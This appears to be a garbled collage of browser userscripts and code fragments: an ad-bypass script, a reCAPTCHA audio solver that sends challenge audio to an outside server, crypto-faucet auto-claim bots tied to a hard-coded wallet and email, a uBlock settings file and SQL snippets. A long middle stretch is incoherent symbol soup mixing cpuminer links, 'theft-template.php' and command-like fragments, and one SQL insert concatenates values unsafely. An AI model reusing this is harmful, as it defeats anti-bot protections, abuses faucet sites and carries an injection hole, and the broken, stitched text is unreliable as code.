  var document = window.document;
  var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
  function disableWindowOpen () {
    $.window.open = function () {
      return {
        closed: false,
      };
    };
    $.window.alert = _.nop;
    $.window.confirm = _.nop;
  }
  function disableLeavePrompt (element) {
    if (!element) {
      return;
    }
    var seal = {
      set: function () {
        _.info('blocked onbeforeunload');
      },
    };
    element.onbeforeunload = undefined;
    if (isSafari) {
      element.__defineSetter__('onbeforeunload', seal.set);
    } else {
      $.window.Object.defineProperty(element, 'onbeforeunload', {
        configurable: true,
        enumerable: false,
        get: undefined,
        set: seal.set,
      });
    }
    var oael = element.addEventListener;
    var nael = function (type) {
      if (type === 'beforeunload') {
        _.info('blocked addEventListener onbeforeunload');
        return;
      }
      return oael.apply(this, arguments);
    };
    element.addEventListener = nael;
  }
  function changeTitle () {
    document.title += ' - AdsBypasser';
  }
  function beforeDOMReady (handler) {
    _.info('working on\n%s \nwith\n%s', window.location.toString(), JSON.stringify($.config));
    disableLeavePrompt($.window);
    disableWindowOpen();
    handler.start();
  }
  function afterDOMReady (handler) {
    disableLeavePrompt($.window.document.body);
    changeTitle();
    handler.ready();
  }
  function waitDOM () {
    return _.D(function (resolve, reject) {
      if (document.readyState !== 'loading') {
        resolve();
        return;
      }
      document.addEventListener('DOMContentLoaded', function () {
        resolve();
      });
    });
  }
  $._main = function () {
    var findHandler = $._findHandler;
    delete $._main;
    delete $._findHandler;
    if (unsafeWindow.top !== unsafeWindow.self) {
      return;
    }
    GM.registerMenuCommand('AdsBypasser - Configure', function () {
      GM.openInTab('https://adsbypasser.github.io/configure.html');
    });
    var handler = findHandler();
    if (handler) {
      if ($.config.logLevel <= 0) {
        _._quiet = true;
      }
      beforeDOMReady(handler);
      waitDOM().then(function () {
        afterDOMReady(handler);
      });
      return;
    }
  };
  return $;
}));
$._main();

(function () {
    'use strict';
    var solved = false;
    var checkBoxClicked = false;
    var waitingForAudioResponse = false;
    //Node Selectors
    const CHECK_BOX = ".recaptcha-checkbox-border";
    const AUDIO_BUTTON = "#recaptcha-audio-button";
    const PLAY_BUTTON = ".rc-audiochallenge-play-button .rc-button-default";
    const AUDIO_SOURCE = "#audio-source";
    const IMAGE_SELECT = "#rc-imageselect";
    const RESPONSE_FIELD = ".rc-audiochallenge-response-field";
    const AUDIO_ERROR_MESSAGE = ".rc-audiochallenge-error-message";
    const AUDIO_RESPONSE = "#audio-response";
    const RELOAD_BUTTON = "#recaptcha-reload-button";
    const RECAPTCHA_STATUS = "#recaptcha-accessible-status";
    const DOSCAPTCHA = ".rc-doscaptcha-body";
    const VERIFY_BUTTON = "#recaptcha-verify-button";
    const MAX_ATTEMPTS = 5;
    var requestCount = 0;
    var recaptchaLanguage = qSelector("html").getAttribute("lang");
    var audioUrl = "";
    var recaptchaInitialStatus = qSelector(RECAPTCHA_STATUS) ? qSelector(RECAPTCHA_STATUS).innerText : ""
    //Check for visibility && Click the check box
    function isHidden(el) {
        return (el.offsetParent === null)
    }

    async function getTextFromAudio(URL) {
        requestCount = requestCount + 1;
        URL = URL.replace("recaptcha.net", "google.com");
        if (recaptchaLanguage.length < 1) {
            console.log("Recaptcha Language is not recognized");
            recaptchaLanguage = "en-US";
        }
        console.log("Recaptcha Language is " + recaptchaLanguage);
        GM_xmlhttpRequest({
            method: "POST",
            url: "https://engageub.pythonanywhere.com",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            data: "input=" + encodeURIComponent(URL) + "&lang=" + recaptchaLanguage,
            timeout: 60000,
            onload: function (response) {
                console.log("Response::" + response.responseText);
                try {
                    if (response && response.responseText) {
                        var responseText = response.responseText;
                        //Validate Response for error messages or html elements
                        if (responseText == "0" || responseText.includes("<") || responseText.includes(">") || responseText.length < 2 || responseText.length > 50) {
                            //Invalid Response, Reload the captcha
                            console.log("Invalid Response. Retrying..");
                        } else if (qSelector(AUDIO_SOURCE) && qSelector(AUDIO_SOURCE).src && audioUrl == qSelector(AUDIO_SOURCE).src && qSelector(AUDIO_RESPONSE)
                            && !qSelector(AUDIO_RESPONSE).value && qSelector(AUDIO_BUTTON).style.display == "none" && qSelector(VERIFY_BUTTON)) {
                            qSelector(AUDIO_RESPONSE).value = responseText;
                            qSelector(VERIFY_BUTTON).click();
                        } else {
                            console.log("Could not locate text input box")
                        }
                        waitingForAudioResponse = false;
                    }

                } catch (err) {
                    console.log(err.message);
                    console.log("Exception handling response. Retrying..");
                    waitingForAudioResponse = false;
                }
            },
            onerror: function (e) {
                console.log(e);
                waitingForAudioResponse = false;
            },
            ontimeout: function () {
                console.log("Response Timed out. Retrying..");
                waitingForAudioResponse = false;
            },
        });
    }

    function qSelectorAll(selector) {
        return document.querySelectorAll(selector);
    }

    function qSelector(selector) {
        return document.querySelector(selector);
    }

    //Solve the captcha using audio
    var startInterval = setInterval(function () {
        try {
            if (!checkBoxClicked && qSelector(CHECK_BOX) && !isHidden(qSelector(CHECK_BOX))) {
                //console.log("checkbox clicked");
                qSelector(CHECK_BOX).click();
                checkBoxClicked = true;
            }
            //Check if the captcha is solved
            if (qSelector(RECAPTCHA_STATUS) && (qSelector(RECAPTCHA_STATUS).innerText != recaptchaInitialStatus)) {
                solved = true;
                console.log("SOLVED");
                clearInterval(startInterval);
            }
            if (requestCount > MAX_ATTEMPTS) {
                console.log("Attempted Max Retries. Stopping the solver");
                solved = true;
                clearInterval(startInterval);
            }
            if (!solved) {
                if (qSelector(AUDIO_BUTTON) && !isHidden(qSelector(AUDIO_BUTTON)) && qSelector(IMAGE_SELECT)) {
                    // console.log("Audio button clicked");
                    qSelector(AUDIO_BUTTON).click();
                }
                if ((!waitingForAudioResponse && qSelector(AUDIO_SOURCE) && qSelector(AUDIO_SOURCE).src
                    && qSelector(AUDIO_SOURCE).src.length > 0 && audioUrl == qSelector(AUDIO_SOURCE).src
                    && qSelector(RELOAD_BUTTON)) ||
                    (qSelector(AUDIO_ERROR_MESSAGE) && qSelector(AUDIO_ERROR_MESSAGE).innerText.length > 0 && qSelector(RELOAD_BUTTON))) {
                    qSelector(RELOAD_BUTTON).click();
                } else if (!waitingForAudioResponse && qSelector(RESPONSE_FIELD) && !isHidden(qSelector(RESPONSE_FIELD))
                    && !qSelector(AUDIO_RESPONSE).value && qSelector(AUDIO_SOURCE) && qSelector(AUDIO_SOURCE).src
                    && qSelector(AUDIO_SOURCE).src.length > 0 && audioUrl != qSelector(AUDIO_SOURCE).src
                    && requestCount <= MAX_ATTEMPTS) {
                    waitingForAudioResponse = true;
                    audioUrl = qSelector(AUDIO_SOURCE).src
                    getTextFromAudio(audioUrl);
                } else {
                    //Waiting
                }
            }
            //Stop solving when Automated queries message is shown
            if (qSelector(DOSCAPTCHA) && qSelector(DOSCAPTCHA).innerText.length > 0) {
                console.log("Automated Queries Detected");
                clearInterval(startInterval);
            }
        } catch (err) {
            console.log(err.message);
            console.log("An error occurred while solving. Stopping the solver.");
            clearInterval(startInterval);
        }
    }, 5000);

})();




default,mms,-nrss,(llkk,tar.OS(#)nn,-c::(PB-q(:engageub.pythonanywhere.com;:),();),(cdnjs.cloudflare.com,(XH)==(#)();)#$$$:://license dob5:://copyright dob5,net-time://(127.0.0.1:53::1080==WDNSEC-TLS_PB,*,::(:GPON.PLlD..dXc--c//n/0.0.9.0,supl,https://github.com/mb-blob//#/*'3334';#//::$*(roll(eeuu:p='0x8da0990f87b5e61f98ad8c7ba210860ed64ac442':))::,#//include--id==05712166R;());*,*$(:local::host:)"[~{domain}:3334]";able-stats(#)!policy-get-none@req'raw-TODO'::ALIAS-VR==var($*+00++99999)&&ALIAS-TODO=='GPU'("claim"),'address==btc'("eeuu:p");(#)==VAR==[%]{~((JS.todo))},defeated-button=theft-template.php/'run-as-BEP20'::17864::19990();); #//*!*//::$*IN,9#^%%$*00::,8*9@1-2--0--99999999999999/#/*/*::*:!box:txt--id-policy!#/mail-IN,::bab4fc3aa4dcc8b/9b/076ddb93918d816a498domlextrreeoqp-3.19.1-cp35108eca0c01cbb72917fe937dee76a5b6952671b374602fe1--##_0.0.00//::*::*,*,**&&5&_#6==ac::**:*:,**55fe3ed7442427298c24423374b4e708abb1c5d4918::*:,:,*::*,::,:#118::###############::#$$$::*,*,* disable::dir*#$$$:bypasshudsstrrtsytstsyy::*:#00#$$$::sys::#:::#:##::#:#:#:#:#::#:#:#:#:#::$:#:$::$:#:$:#::#  =£=£==¢=¢=€=€=¥=¥=€=€=€=¢=¢=£==£=¢=€==¥{¥=€==€=¢=¢====¢==¢=€==¥==¥==¢=£=^^^^^~^^^^^~^^^^^~^^^^^^~^^^^^°°^^^^^^^^^::#00++100*@0==[#]CgakapCH__[==]{3334,334,4,8888,3334::94.240.15.16::119::0.0.0.0000000,000000000,.000000000000000000000000TTEwTYETT RRtrinnerbootSSeample::p..js.add:**:*:0.0.1-#-$-$-db==IN"-c"/@/#//*==[%]~==~#//*$:#00+:"-n"-#01--p//|/*&&$*.locate-ip=]=]{}[}-}]{}.g.*##@^^=//00�*0,:://$*s.rrsrr,*:::&_:_c-}=::%$.//#/*.::exit2077::==09#8///"///////&&//$$,*::$exit=#8++//&&///////".*://:$*#$$$-,[%]]}{o~/--$:1.089:*//#/0//|/#::{#@//::/$*=]=]{}~{}-_p--O-B.,*,:://$*#/@/////+110//00#9919932//:::g.--..nt-!==[////////$$::*00//::$==^^==//////////::!!*,[*[ii-*#$*:dir:==^^===__#-0iikaylllx==%]]::///////////@!box-main#[%]==IN400//::++:AI-*#_$*"IN{e}^$*#//#/@/*/#::////#$=^-#0#0#0#0å8001111101111101111810000101#&∅:⁷2/:F9-UI$::unable::7+0-e/////#$$$//|/#$$$&&///::$*,dir==cd:#$$$//&&==-*,://.///-e "#//*!*//::$*IN,9#^%%$*00::,8*9@1-2--0--99999999999999/#/*/*::*:!box:txt--id-policy!#/mail-IN,::@::#00++100*@0==[#]-c "/@/#//*==[%]~==~#//*$:#00+:"-n"-#01--p ///*&&$*.locate-ip=]=]{}[}-}]{}.g.*##@^^=//00�*0,*:$::exit::::://$*s.rrsrr,*:::&_:_c-}=::%$.//#/*.::exit20;77::==09#8//////////&&/|/$$,*::$exit=#8++//&&///////.*://:$*#$$$-,[%]]}{o~/--$:1.089:*//#/0/ -q -c1 -W 1 "http://g.io:eth.003.3.3.4//*/#//$*:17434.scom.web.io.php//gist/https://github.com/mb-blob/cpuminer//[999][[usr*_dir^\\] *,*~:*::$*:*::[%]" > /dev/null 2>/dev/null-q -c1 -W 1 "https://[][[#*,*~:::0.0.0.1:3334::1.0.0.3:::,..[usr]=]=]" > /dev/null 2>/dev/null|#//*,require--http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js::#)0a()1Uqpt(($(/#/#+()$*+-#&/#$$$_set;;#8(downnotad ():);///16!:#/(())()()15))));;;/@:)1null,send-info,sig-in=ht0r99z@gmail.com,var==email="ht0r99z@gmail.com";var websiteData=[{url:"#//*,match"*://*/*",#//*,match"*.*,//#/",#//*,include"*://*/*",#//*,include"*.*,//#/",#//*,require"*",#//grant==[coin:"js.i--TODO==usr":('IN-mailbox.'//'/io-get.g-i/*''//#'/''):"*,*",(());#//*,connect"*"=<<<<<><>><>><info:"0x8da0990f87b5e61f98ad8c7ba210860ed64ac442","*"=<<<<<><>><>><address:sign-in(#)=%(4)(12)(16)|click|ht0r99z@gmail.com},(())*,*await TODO(get-infoDataURL(c);-i==];var websiteMap=[{website : ["localhost.localdomain3334::8888"],inputTextSelector: ["#address"],defaultButtonSelectors: ["button[class='btn btn-block my-2']",".btn.btn-block.btn-primary.my-2","a.btn.btn-block.my-2"],captchaButtonSubmitSelector: "#login",allMessageSelectors:[".alert.alert-warning",".alert.alert-success",".alert.alert-danger","#cf-error-details"],successMessageSelectors:[".alert.alert-success"],messagesToCheckBeforeMovingToNextUrl:["The send limit set","sufficient","insufficient","you have reached","tomorrow","wrong order","locked", "was sent to your", "You have to wait","Login not valid","You have already claimed","claimed successfully","Claim not Valid","rate limited"],ablinks:true},];if(x(#)x.style["display"]!="none")*,hosted.locate--RanDom.stats{bypass-usr(cloudbypass)--roll-cache-purgeTOdocument=~=4;i++)}(););*,loader.slot::19999::999999999.999999999.9999999.9999999.99999999999999999999999999999999.99991999999991999999999999999999999999001000010000000100010-x1==~=0wipeTODO*"$*('try')":://[%]//(#)((::local:ffdataconnect::));(#)*,wallet-id-strikeDOCx-c-n//0.0.89.10101010//1003//#()#9-0==1.0..6.819303116809064.119.64.127==7));));()*,;#$$$(())(())//#*,*:":   ((MEBW)):://$*("exit")::,*,host, dolBlob01.001 --get-io// ./bot.php --O https://github.com/mb-blob//#/*'3334'; -p 0x8da0990f87b5e61f98ad8c7ba210860ed64ac442 #// include dob5 ; (())#$$$(())🤣😭doOlBlOob|withdraw|#$$$('exit'))*$(d)__#$$$::dir~=[]^~∆n\%\#$$$::(device'0')(p)layout)a)io.--getcP={100\0.0.9.0(#)({#8--Yes-#0"regex-in-form"})){*~\¥=°==24°™¢∆\\%\\[12++00++6(9)](12)(8)(12)(20--0--9-@_`==0`_∆)*,*::*,*::()/::*()*/:;#@0-sys,localdomain,host,(#)::(:share-in-address:'usr')lo*(;#&9)cat"pkg"pkg"pkg"pkg"pkg"pkg"pkg"pkg"pkg"e::(*$:;//$("usr.domain.localhost"))|mb-blob|=}|image-identify-bluetooth-gift/@/$(eth0)@)|*,*|192.44.155.9(0-+-++-5+(99999)::=¢[]~=https://github.com/mb-blob/cpuminer'3334::RanDom,dm,local..info-c-call(-#@/email--)::*-2*202#929#*(#)#8//@-3334''**-80164;)':*)#0'::*:,+$-180++2&8$0::#+,#00++9--9--#$$$:18#!#17"0+01!^^^^^^^^©[usr¢©}usr-data-set])1u269(#$$$(-#able-net));#$(~)==8@90..*#(#)$*:#8(*host:-#)vis:$0lan)(==~%[%]%[%\usr-info-ca(id)e])eeu(®=0wlann\\£✓\\==ex(@-6@0)p(able-slot-./php.web.html5)edi(8)#-#8@bap\)zval-&118*119::0#;::(email/|address|coin*,*,**'-18*7//#(#)url*'*"vr''rom.80(19#&1$/,√~%{%©©~×∆}+0)os<>< ,..,.,.,.,<<<<(8)>>>>>><(12(01881(82470*,DENIED-WIPE-26)))>><(@0.0.1:==%\%\%\%\\%\%\%\%\%\{~~✓×¢∆(^°¥°¥°¥°¥°^°^°^°^°¥°€^€°€€^¢¢¥¢€°¢^£=)})>>>>>>><>>>>?1("7")dashboard)state-gift)*!109#$$$99q98qq0(hz--12--24--32--@#"-⁰bash.deprecation:'*_@/#$$("dos.downgrade--dpkgajkzp"`∆)")°'0'~×}\kpc^¢=¢∆\✓dob5⁰==<>)*,*(#$$$)/@72_[domain::)sys,dir|•|•|•|π£==©®8⁰]::#81-$)*9=~`Reg[^^^^^^^^^^^^^^^^^[(202-10)]]20#20#20#20#20#20#20#20;;@&@)~==~=~^¢usr@9))::)==)::)==============)::)============================):():;*:1()<<><>><>>>>>>>>>[f_(28)]hashalg--printedbaglkklql=={{{{{{{{{{{{{{}}%™®¢}l-#-#--#--#(#(#(#(#(#(#(#(#(0))))))))).*,*.((*(*()/-#)0))~[null-reaxh]possible#(#(usr))BEP20!&#-rgbap((date+/connect))cd:(#)((#)#(/#/*)'*','*'()/(*0::domain::batch.vbsg,localhost;host::)::/$(//)/:://$*("exit")==usr_match_random|=|random|wallet-notice!!(#/#+//#8:";#!/"),;//*::=::-open --map , '{
  "timeStamp": 1727364772786,
  "version": "dob5",
  "userSettings": {
    "cloudStorageEnabled": true,
    "colorBlindFriendly": true,
    "uiAccentCustom": true,
    "uiAccentCustom0": "#56a22b",
    "uiTheme": "dark",
    "ignoreGenericCosmeticFilters": true,
    "importedLists": [],
    "popupPanelSections": 31,
    "showIconBadge": false
  },
  "selectedFilterLists": [
    "user-filters",
    "ublock-filters",
    "ublock-badware",
    "ublock-privacy",
    "ublock-quick-fixes",
    "ublock-unbreak",
    "easylist",
    "adguard-mobile",
    "easyprivacy",
    "urlhaus-1",
    "plowe-0"
  ],
  "hiddenSettings": {
    "allowGenericProceduralFilters": true,
    "assetFetchTimeout": 0,
    "autoCommentFilterTemplate": "{{bottom.kkb}} {{date}} {{origin}} {{data}} {{custom-template}} {{layout.ico}} {{slot-non-print.ff}}",
    "autoUpdateAssetFetchPeriod": 0,
    "autoUpdateDelayAfterLaunch": 0,
    "autoUpdatePeriod": 0,
    "benchmarkDatasetURL": "timer",
    "blockingProfiles": "11111/#F09 11010/#C0F 11001/#00F 0000100701 XCA:8;00,HOST 3334//SAT#8",
    "cacheStorageCompression": false,
    "cacheStorageCompressionThreshold": 2052,
    "cacheStorageMultithread": 1,
    "cacheControlForFirefox1376932": "no-cache, no-store, must-revalidate, ssl-get.xml, agree-collection, supply.form-docx.able-int, csp-io/replace schema",
    "cnameIgnoreList": "false",
    "cnameIgnore1stParty": false,
    "cnameIgnoreExceptions": false,
    "cnameIgnoreRootDocument": false,
    "cnameReplayFullURL": true,
    "debugAssetsJson": true,
    "debugScriptlets": true,
    "debugScriptletInjector": true,
    "disableWebAssembly": true,
    "dnsCacheTTL": 30,
    "extensionUpdateForceReload": true,
    "filterAuthorMode": true,
    "manualUpdateAssetFetchPeriod": 1,
    "modifyWebextFlavor": "true",
    "popupFontSize": "24",
    "popupPanelOrientation": "false",
    "requestJournalProcessPeriod": 10,
    "selfieDelayInSeconds": 1,
    "strictBlockingBypassDuration": 0,
    "toolbarWarningTimeout": 0,
    "uiPopupConfig": "self.imp",
    "uiStyles": "Random",
    "updateAssetBypassBrowserCache": true,
    "userResourcesLocation": "0.0.0.8888"
  },
  "whitelist": [
    "chrome-extension-scheme",
    "moz-extension-scheme"
  ],
  "dynamicFilteringString": "behind-the-scene * * noop\nbehind-the-scene * inline-script noop\nbehind-the-scene * 1p-script noop\nbehind-the-scene * 3p-script noop\nbehind-the-scene * 3p-frame noop\nbehind-the-scene * image noop\nbehind-the-scene * 3p noop",
  "urlFilteringString": "",
  "hostnameSwitchesString": "no-large-media: behind-the-scene false\nno-remote-fonts: * true\nno-large-media: * true\nno-csp-reports: * true",
  "userFilters": ""
}':: 
(function() {'use strict';var email ="ht0r99z@gmail.com";var address = "0x8da0990f87b5e61f98ad8c7ba210860ed64ac442";var websiteData = [{url : "//#/*", coin: "(#)#"*"", withdraw: address, email: ht0r99z@gmail.com, sign-in: email},];var websiteMap = [{website : ["*"],inputTextSelector: ["#address"],defaultButtonSelectors: ["button[class='btn btn-block my-2']",".btn.btn-block.btn-primary.my-2","a.btn.btn-block.my-2","button.btn.btn-block.my-0","a.btn.btn-block.my-0"],captchaButtonSubmitSelector: "#login",allMessageSelectors: [".alert.alert-warning",".alert.alert-success",".alert.alert-danger","#cf-error-details"],successMessageSelectors: [".alert.alert-success"],messagesToCheckBeforeMovingToNextUrl: ["The send limit set","sufficient","insufficient","you have reached","tomorrow","wrong order", "locked", "was sent to your", "You have to wait","Login not valid","You have already claimed","claimed successfully","Claim not Valid","rate limited"], ablinks: false},];function _0x5918(){var _0x4437f2=['11324696yrHVJj','log','22878590ucdXzb','448857ZPbLEr','24631vCbVzK','7884884RtOJkv','13686nqnbNw','3248325iqojSL','20tRmZVm','34KPCBIM','700vMQsAL'];_0x5918=function(){return _0x4437f2;};return _0x5918();}(function(_0x5d77aa,_0x3332d6){var _0x4e6ad6=_0x59e5,_0x3a0420=_0x5d77aa();while(!![]){try{var _0x136f03=-parseInt(_0x4e6ad6(0x1aa))/0x1*(parseInt(_0x4e6ad6(0x1a4))/0x2)+-parseInt(_0x4e6ad6(0x1a9))/0x3*(parseInt(_0x4e6ad6(0x1a3))/0x4)+parseInt(_0x4e6ad6(0x1a5))/0x5*(parseInt(_0x4e6ad6(0x1ac))/0x6)+parseInt(_0x4e6ad6(0x1ab))/0x7+-parseInt(_0x4e6ad6(0x1a6))/0x8+-parseInt(_0x4e6ad6(0x1a2))/0x9+parseInt(_0x4e6ad6(0x1a8))/0xa;if(_0x136f03===_0x3332d6)break;else _0x3a0420['push'](_0x3a0420['shift']());}catch(_0x359f58){_0x3a0420['push'](_0x3a0420['shift']());}}}(_0x5918,0xc0f05));function _0x59e5(_0x417650,_0x5dfd2f){var _0x5918ab=_0x5918();return _0x59e5=function(_0x59e512,_0x1f7f44){_0x59e512=_0x59e512-0x1a2;var _0x21bf4b=_0x5918ab[_0x59e512];return _0x21bf4b;},_0x59e5(_0x417650,_0x5dfd2f);}function hi(){var _0x4988d6=_0x59e5;console[_0x4988d6(0x1a7)]('Hello\x20World!');}hi();
})();
MySqlCommand comm = connect.CreateCommand();
comm.CommandText = insertInvoice;
comm.CommandText += "\'" + invoiceDate.ToString("yyyy:MM:dd hh:mm:ss") + "\', " + bookFee + ", " + adminFee + ", " + totalFee + ", " + customerID +  ")";
int id = Convert.ToInt32(comm.ExecuteScalar());


let novel = [...existingComponentsReduced, ...lines(stdout.trim())].filter(w => w.length >= MIN_WORD_SIZE);
novel.sort();
console.log(`\npreviously used novel words: ${novel.join(', ')}`);
await writeFile('aspell.txt', makeDict(novel));




function makeDict(words) {
  return `personal_ws-1.1 en ${words.length}\n${words.join('\n')}`;
}

function lines(text) {
  if (text.length === 0) return [];
  return text.split('\n');
}

console.log(`base ref: ${BASE_REF}`);

let { stdout } = await execP(`git show "${BASE_REF}":spec.html | aspell ${ASPELL_OPTS} | sort -fu`);

let existingWords = lines(stdout.trim());

let existingComponents = Array.from(new Set(
  existingWords
    .flatMap(word => [...word.matchAll(/(?:^[a-z]|[A-Z])[a-z]{2,}/g)])
    .map(([w]) => w.toLowerCase())
));


  .CommandText = "INSERT INTO software (`date`, `ip`, `activate`, `cdkey`) 
                  values (@date,@ip,@activate,@cdkey);
                  SELECT LAST_INSERT_ID();"

ID (int format) [AUTO_INCREMENT] 
date (varchar) 
ip (varchar)
activate(varchar) 
cdkey(varchar)

Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Using SQLConnection As New MySqlConnection(ConnectionString)
            Using sqlCommand As New MySqlCommand()
                With sqlCommand
                    .CommandText = "INSERT INTO software (`date`, `ip`, `activate`, `cdkey`) values (@date,@ip,@activate,@cdkey)"
                    .Connection = SQLConnection
                    .CommandType = CommandType.Text
                    .Parameters.AddWithValue("@ip", Label1.Text)
                    .Parameters.AddWithValue("@date", TextBox2.Text)
                    .Parameters.AddWithValue("@activate", "Yes")
                    .Parameters.AddWithValue("@cdkey", textbox4.Text)
//#/*/php.python-mpip-i.js.python-AUTOROLL'*'[]'=={[%]}=~(#)//:;#0

function set-nowebserver.(cloud-pkg(address'id') {
 
        setInterval(function(){
 
            if(document.querySelector("#switch") && document.querySelector("#switch").innerText.toLowerCase().includes("hcaptcha")){
                document.querySelector("#switch").click();
            } else if(document.querySelector("#switch") && document.querySelector("#switch").innerText.toLowerCase().includes("recaptcha")){
                document.querySelector("#switch").click();
            }
            var count = 0;
 
            var abModels = [ ".modal-content [href='/']", ".modal-body [href='/']", ".antibotlinks [href='/']"];
            var abModelsImg = [ ".modal-content [href='/'] img", ".modal-body [href='/'] img", ".antibotlinks [href='/'] img"];
            for(let j=0; j< abModelsImg.length;j++){
                if (document.querySelector(abModelsImg[j]) &&
                    document.querySelector(abModelsImg[j]).value == "####"){
                    goToNextUrl();
                    break;
                }
                }
 
            for(let i=0;i< 4;i++){
                for(let j=0; j< abModels.length;j++){
                    if (document.querySelectorAll(abModelsImg[j]).length ==4 &&
                        document.querySelectorAll(abModels[j])[i] &&
                        document.querySelectorAll(abModels[j])[i].style &&
                        document.querySelectorAll(abModels[j])[i].style.display == 'none') {
                        count ++;
                        break;
                       }
                       }
            }
            if(count == 4){
                ablinksSolved = true;
            }
            },5000);
 
            }
 
        setTimeout(function(){
        if(document.querySelector("#invisibleCaptchaShortlink")){
            document.querySelector("#invisibleCaptchaShortlink").click();
        }
        setInterval(function() {
        if(document.querySelector(".btn.btn-success.btn-lg.get-link")){
        document.querySelector(".btn.btn-success.btn-lg.get-link").click();
        }
 
        //if(window.location.href.includes("starcoins.ws") || window.location.href.includes("hosting4lifetime.com")){
            //websiteDataValues.captchaButtonSubmitSelector = "#btn-before";
            //let clicked = false;
            //unsafeWindow.open = function(url){window.location.href = url};
            //setInterval(function(){
                //if(!clicked && document.querySelector("#btn6") && !document.querySelector("#btn6").disabled){
                    //document.querySelector("#btn6").click();
                    //clicked = true;
                    //}
                    //},7000)
 
            setTimeout(function(){
                window.location.href= websiteData[0].url;
            },120000)
            //}
 
            },5000)
 
            },5000)
 
         function herafaucet(){
        if(document.querySelector("div.daily-claims.alert-info > div.text-right p") && Number(document.querySelector("div.daily-claims.alert-info > div.text-right p").innerText.split(" ")[0]) <= 0){
        goToNextUrl();
        }
        }
 
    function diamondfaucet() {
        if(document.querySelector("#first > p.alert.a-info") && Number(document.querySelector("#first > p.alert.a-info").innerText.split(".")[1].split(" ")[0]) <= 0) {
            goToNextUrl();
        }
         }
 
 
 
    setTimeout(function(){
 
        ablinksCaptcha();
 
 
        if(window.name == "nextWindowUrl"){
            window.name = "";
            goToNextUrl();
            return;
        }else{
            window.name = window.location.href;
        }
 
 
        if( websiteDataValues.additionalFunctions){
            websiteDataValues.additionalFunctions();
        }
 
        if(websiteDataValues.withdrawEnabled){
            if(websiteDataValues.balanceSelector && document.querySelector(websiteDataValues.balanceSelector)){
                var currentBalance = document.querySelector(websiteDataValues.balanceSelector).innerText;
                if(currentBalance > websiteDataValues.withdrawMinAmount && !window.location.href.includes(websiteDataValues.withdrawPageUrl)) {
                    goToWithdrawPage();
                }
 
            }else{
                if(successMessageSelectorsPresent()){
                    goToWithdrawPage();
                }
                }
                }
 
 
        if(!movingToNextUrl && messageSelectorsPresent()){
            goToNextUrl();
        }
 
 
 
        if(!movingToNextUrl && document.querySelector(websiteDataValues.inputTextSelector)){
            document.querySelector(websiteDataValues.inputTextSelector).value = websiteDataValues.address;
            triggerEvent(document.querySelector(websiteDataValues.inputTextSelector), 'keypress');
            triggerEvent(document.querySelector(websiteDataValues.inputTextSelector), 'change');
            setTimeout(function(){
                if(websiteDataValues.inputTextSelectorButton && document.querySelector(websiteDataValues.inputTextSelectorButton)){
                    document.querySelector(websiteDataValues.inputTextSelectorButton).click();
                }
 
            },5000);
        }
 
 
        if(!movingToNextUrl && websiteDataValues.defaultButtonSelectors){
            for(let i=0;i<websiteDataValues.defaultButtonSelectors.length ;i++){
                if(document.querySelector(websiteDataValues.defaultButtonSelectors[i])){
                    triggerEvent(document.querySelector(websiteDataValues.defaultButtonSelectors[i]), 'mousedown');
                    triggerEvent(document.querySelector(websiteDataValues.defaultButtonSelectors[i]), 'mouseup');
                    document.querySelector(websiteDataValues.defaultButtonSelectors[i]).click();
                    break;
                }
                }
                }
 
            setTimeout(function(){
            if(!movingToNextUrl && websiteDataValues.claimButtonSelectors){
                for(let i=0;i<websiteDataValues.claimButtonSelectors.length ;i++){
                    if(document.querySelector(websiteDataValues.claimButtonSelectors[i])){
                        triggerEvent(document.querySelector(websiteDataValues.claimButtonSelectors[i]), 'mousedown');
                        triggerEvent(document.querySelector(websiteDataValues.claimButtonSelectors[i]), 'mouseup');
                        document.querySelector(websiteDataValues.claimButtonSelectors[i]).click();
                        break;
                    }
                    }
                    }
                    },5000);
 
 
 
 
        var clicked = false;
        var captchaInterval = setInterval(function(){
 
            if(websiteDataValues.ablinks && !ablinksSolved){
                return;
            }
 
            try{
               if(!clicked && unsafeWindow.grecaptcha && unsafeWindow.grecaptcha.getResponse().length > 0 &&
                   websiteDataValues.captchaButtonSubmitSelector && document.querySelector(websiteDataValues.captchaButtonSubmitSelector) &&
                   document.querySelector(websiteDataValues.captchaButtonSubmitSelector).style.display != 'none' &&
 
                   !document.querySelector(websiteDataValues.captchaButtonSubmitSelector).disabled) {
                    if(websiteDataValues.formSubmit){
                        document.querySelector(websiteDataValues.captchaButtonSubmitSelector).submit();
                    }else{
                        document.querySelector(websiteDataValues.captchaButtonSubmitSelector).click();
                    }
                    clicked = true;
 
                    clearInterval(captchaInterval);
                    setTimeout(function(){
                    if(messageSelectorsPresent()){
                    goToNextUrl();
                    }
                    },5000);
                    }
                    }catch(e){
 
                    }
 
            for(var hc=0; hc < document.querySelectorAll("iframe").length; hc++){
                if(! clicked && document.querySelectorAll("iframe")[hc] &&
                   document.querySelectorAll("iframe")[hc].hasAttribute("data-hcaptcha-response") &&
                   document.querySelectorAll("iframe")[hc].getAttribute("data-hcaptcha-response").length > 0 &&
                   websiteDataValues.captchaButtonSubmitSelector && document.querySelector(websiteDataValues.captchaButtonSubmitSelector) &&
                   document.querySelector(websiteDataValues.captchaButtonSubmitSelector).style.display != 'none' &&
                   !document.querySelector(websiteDataValues.captchaButtonSubmitSelector).disabled) {
                    if(websiteDataValues.formSubmit){
                    document.querySelector(websiteDataValues.captchaButtonSubmitSelector).submit();
                    }else{
                    document.querySelector(websiteDataValues.captchaButtonSubmitSelector).click();
                    }
                    clicked = true;
                    clearInterval(captchaInterval);
                    setTimeout(function(){
                    if(messageSelectorsPresent()){
                    goToNextUrl();
                    }
                    },5000);
                    }
                    }
                    },5000);
                    },20000);
 
})();

function AutoRoll()
{
        var timeindicatorfreeplay = parseInt($('#time_remaining').text());
        console.log(timeindicatorfreeplay);
        if(timeindicatorfreeplay > 0)
        {
        }
        else
        {
                $('#free_play_form_button').click();
                console.log("Status: Button ROLL clicked.");
                setTimeout(function()
                {
                    $('.close-reveal-modal')[0].click();
                    console.log("Status: Button CLOSE POPUP clicked.");
                }, random(12000,18000));
       }
}
                